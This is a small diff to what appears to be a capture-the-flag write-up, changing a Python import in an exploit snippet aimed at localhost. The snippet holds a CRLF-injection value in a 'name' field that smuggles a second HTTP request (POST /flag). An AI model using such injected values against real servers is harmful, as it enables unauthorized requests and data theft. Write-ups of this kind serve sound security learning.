@@ -97,7 +97,7 @@ The application uses session settings to create a stream context, which is user-
 
 ```python
 import requests
-import urllib.parse
+import urllib
 
 url = "http://localhost:8080"
 name = "x HTTP/1.1\r\nHost: ftp\r\n\r\n\r\nPOST /flag HTTP/1.1\r\nx-get-flag:"
